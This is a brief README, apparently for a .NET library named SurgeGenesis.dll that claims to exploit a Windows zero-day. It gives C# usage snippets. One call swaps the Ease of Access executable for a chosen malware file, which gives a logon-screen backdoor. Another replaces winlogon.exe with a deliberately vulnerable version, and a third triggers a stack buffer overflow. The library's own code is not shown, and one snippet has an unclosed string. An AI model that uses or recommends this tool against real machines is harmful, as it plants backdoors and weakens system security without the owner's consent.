# Surge Genesis

If you import SurgeGenesis.dll into your .NET application in Visual Studio in the References, you can exploit the 0day.

Just call
```cs 
using SurgeGenesis;
```
and
```cs
SurgeGenesis.Surger genesis = new SurgeGenesis.Surger();
```

Then you can use some commands like
```cs
Genesis.SurgeStart("c:\users\johndoe\downloads\MalwareFile.exe);  // Replaces the Ease of Access file with the selected file
Genesis.SurgeBuffer();  // Replaces winlogon.exe with a bugged version that has security bugs
Genesis.BufferOverflow();  // Starts a Stack Buffer Overflow (not reccomended as it is just a bufferoverflow to have if you don't know how to make a bufferoverflow payload)
```
